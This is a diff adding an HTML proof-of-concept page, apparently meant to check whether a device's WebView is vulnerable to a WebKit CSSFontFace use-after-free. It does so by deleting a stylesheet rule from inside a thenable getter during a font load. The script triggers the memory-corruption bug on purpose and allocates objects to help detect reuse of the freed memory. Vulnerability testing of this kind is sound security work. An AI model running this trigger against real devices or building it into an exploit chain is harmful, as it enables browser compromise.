@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<pre id="log"></pre>
+<script>
+// CSSFontFace UAF detection test (WebKit Bug 312202)
+// Based on WebKit regression test: fontface-setstatus-crash.html
+// If the WebView crashes, the bug is present (UAF triggered).
+// If it survives and prints "SURVIVED", the fix is applied.
+
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+}
+
+window.onload = () => {
+    log('[*] CSSFontFace UAF test starting...');
+
+    // JS-created face with a local source so it resolves synchronously.
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    log('[+] FontFace A added to document.fonts');
+
+    // Register a DeferredPromise on A.
+    void A.loaded;
+
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                log('[!] Thenable getter fired - attempting stylesheet mutation');
+                // Allocate to help detect freed memory reuse.
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                // Remove the CSS @font-face rule and force style recalc.
+                // This frees the CSS-backed CSSFontFace while FontFaceSet::load
+                // still holds a raw reference to it in matchingFaces.
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop; // Force style recalc
+                log('[!] Stylesheet mutated and style recalced');
+            }
+            return undefined;
+        }
+    });
+
+    // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule).
+    // A resolves synchronously, firing the thenable check getter above.
+    log('[*] Calling document.fonts.load("1em x", "AB")...');
+    document.fonts.load('1em x', 'AB');
+
+    setTimeout(() => {
+        log('[+] SURVIVED - CSSFontFace UAF appears PATCHED on this firmware');
+        log('[*] Thenable getter fired: ' + fired);
+        // Clean up
+        delete FontFace.prototype.then;
+    }, 100);
+};
+</script>
+</body>
+</html>
